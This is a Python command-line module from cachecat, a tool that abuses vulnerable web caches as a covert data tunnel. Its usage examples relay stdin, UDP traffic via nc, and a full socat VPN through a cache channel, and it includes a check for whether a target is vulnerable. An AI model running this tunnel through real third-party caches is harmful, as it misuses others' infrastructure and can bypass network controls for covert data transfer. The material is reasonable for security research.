"""
Along with the python interface, **cachecat** supports the bash command
:code:`cachecat`, which automatically handles connecting to a web cache
channel and routing data through it like a tunnel.

As a simple example, we start by connecting two clients to the same web
cache channel and exchanging data over stdin/stdout. Note that in order
for this connection to work, the two clients must connect within about
15 seconds of each other, or else the cache expires and they cannot
synchronize.

.. code-block:: bash

    # Connect first client to the cache server on channel 100
    $ cachecat -u https://webcachetunneling.com/ -k q -c 100
    
    # Connect second client and send data from stdin
    $ cachecat -u https://webcachetunneling.com/ -k q -c 100
    Hello,
    world!

We can also proxy data from a UDP connection, like so.

.. code-block:: bash

    # Connect to the cache server and proxy UDP traffic to it over port 1337
    $ cachecat -u https://webcachetunneling.com/ -k q -c 101 -lp 1337
    
    # Connect second client to the cache server
    $ cachecat -u https://webcachetunneling.com/ -k q -c 101

    # Connect a UDP client to the proxy and send data
    $ nc -u 127.0.0.1 1337
    Hello,
    world!

We can take this a step further by tunneling a VPN over this proxied UDP
connection. Keep in mind that the technique and packet loss will severly
limit throughput over this VPN.

.. code-block:: bash

    # Connect to the cache on the first server and listen for UDP
    (1) $ cachecat -u https://webcachetunneling.com/ -k q -c 102 -lp 1337 -v
    
    # Connect to the cache on the second server and listen for UDP
    (2) $ cachecat -u https://webcachetunneling.com/ -k q -c 102 -lp 1337 -v

    # Start a VPN on the first server and proxy it through UDP
    (1) $ socat -v UDP:127.0.0.1:1337 tun:192.168.100.1/24,up

    # Start a VPN on the second server and proxy it through UDP
    (2) $ socat -v UDP:127.0.0.1:1337 tun:192.168.100.2/24,up

    # The servers should now be routed together, try pinging them
    (2) $ ping 192.168.100.1 -c 5 -i 8
    64 bytes from 192.168.100.1: icmp_seq=1 ttl=64 time=3647 ms
    64 bytes from 192.168.100.1: icmp_seq=2 ttl=64 time=2789 ms
    64 bytes from 192.168.100.1: icmp_seq=3 ttl=64 time=3451 ms
    64 bytes from 192.168.100.1: icmp_seq=4 ttl=64 time=2542 ms
    64 bytes from 192.168.100.1: icmp_seq=5 ttl=64 time=3581 ms
    
    --- 192.168.100.1 ping statistics ---
    5 packets transmitted, 5 received, 0% packet loss, time 32014ms
    rtt min/avg/max/mdev = 2541.664/3201.966/3647.293/449.538 ms


"""
import os, sys, argparse, logging, socketserver, socket, shortuuid, ipaddress 
from urllib.parse import urlparse
from .cache import Cache
from .session import Session
from .io import CacheReader, CacheWriter, CacheIO
from . import log

class CacheUDPHandler(socketserver.BaseRequestHandler):
    """Route data from a socketserver to cache stream"""
    stream  = None

    def handle(self):
        data, socket = self.request
        if self.stream:
            self.stream.write(data)

class BroadcastUDPServer(socketserver.UDPServer):
    """Custom UDP server to broadcast messages to all clients"""
    clients = None

    def server_activate(self):
        self.clients = list()

    def verify_request(self, request, client_address):
        if client_address not in self.clients:
            self.clients.append(client_address)
        return True

    def sendto_all(self, data):
        for client in self.clients:
            self.socket.sendto(data, client)

def run(channel, check=False, interval=1, listen=False, port=None, interface="0.0.0.0", **kwargs):
    """
    Proxy data through a vulnerable web cache.

    :param int channel: channel port for session
    :param bool check: whether to check if target is vulnerable
    :param int interval: the time in seconds to wait between cache checks
    :param bool listen: whether to listen for input over TCP
    :param int port: local port to listen on
    :param str interface: local ip address to listen on
    """
    cache = Cache(**kwargs)

    # Check if target is vulnerable
    if check:
        data = os.urandom(8)
        token = shortuuid.uuid()
        cache[token] = data
        m = cache[token]
        assert m == data, "Target check failed: %s != %s" % (m, data)

    # Establish session IO
    session = Session(channel)
    reader = CacheReader(cache, session)
    writer = CacheWriter(cache, session)

    # Route input from UDP server
    if listen:
        assert port, "missing port number"
        assert interface, "missing interface"
        log.info("Listening on %s %i", interface, port)

        # Build UDP server callback
        with BroadcastUDPServer((interface, port), CacheUDPHandler) as server:

            # Build stream and feed from UDP server
            with CacheIO(reader, writer, server.sendto_all, interval) as stream:
                server.RequestHandlerClass.stream = stream
                server.serve_forever()

    # Route input from UDP client
    elif port:
        assert interface, "missing interface"
        log.info("Connecting to %s %i", interface, port)

        # Build UDP client callback
        sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        def udpout(data):
            sock.sendto(data, (interface, port))
        #udpout(b"X")    # Initiate connection

        # Build stream and feed from UDP client
        with CacheIO(reader, writer, udpout, interval) as stream:
            while True:
                data, addr = sock.recvfrom(1024)
                if not data:
                    break
                stream.write(data)

    # Route input from STDIN
    else:
        log.info("Listening on STDIN")

        # Build STDOUT callback
        def stdout(data):
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()

        # Build stream and feed from STDIN
        with CacheIO(reader, writer, stdout, interval) as stream:
            while True:
                data = sys.stdin.buffer.readline()
                if not data:
                    break
                stream.write(data)

def url(s):
    """Validate url input"""
    u = urlparse(s)
    if u.scheme not in ["http", "https"]:
        raise ValueError(s)
    return u.geturl()

def port(s):
    """Validate port input"""
    i = int(s)
    if i not in range(0, 65536):
        raise ValueError(s)
    return i

def ip_address(s):
    """Validate ip address input"""
    return str(ipaddress.ip_address(s))

def main():
    """Commandline entrypoint"""

    # Process arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", type=url, help="url with vulnerable web cache", required=True)
    parser.add_argument("-c", "--channel", type=int, help="cache channel port", required=True)
    parser.add_argument("-k", "--key", type=str, help="cache-keyed url argument for token", required=True)
    parser.add_argument("-s", "--slot", type=str, help="non-cache-keyed url argument for message", default="p")
    parser.add_argument(      "--check", action="store_true", help="check if url is vulnerable before connecting", default=False)
    parser.add_argument(      "--interval", type=int, help="cache sync interval in seconds (%(default)i)", default=1)
    parser.add_argument("-l", "--listen", action="store_true", help="listen mode, for inbound connects", default=False)
    parser.add_argument("-p", "--port", type=port, help="specify local port for remote connects")
    parser.add_argument("-i", "--interface", type=ip_address, help="specify local interface for remote connects (%(default)s)", default="0.0.0.0")
    parser.add_argument(      "--proxy", type=url, help="specify http proxy to route requests through")
    parser.add_argument("-v", "--verbose", action="store_true", help="verbose", default=False)
    parser.add_argument("-d", "--debug", action="store_true", help="debug", default=False)
    args = parser.parse_args()
    kwargs = vars(args)

    # Configure logging
    if args.verbose:
        handler = logging.StreamHandler(sys.stderr)
        handler.setFormatter(logging.Formatter("%(message)s"))
        handler.setLevel(logging.DEBUG if args.debug else logging.INFO)
        log.addHandler(handler)

        # Log debug information
        # if args.debug:
        #     try:
        #         from http.client import HTTPConnection
        #         HTTPConnection.debuglevel = 1
        #     except ImportError:
        #         pass

    # Execute
    try:
        run(**kwargs)

    # Handle interrupt
    except KeyboardInterrupt:
        print("\r")

    # Handle known errors
    except (AssertionError, OSError)as e:
        log.error(e)

    # Handle unknown errors
    except Exception as e:
        log.exception(e)
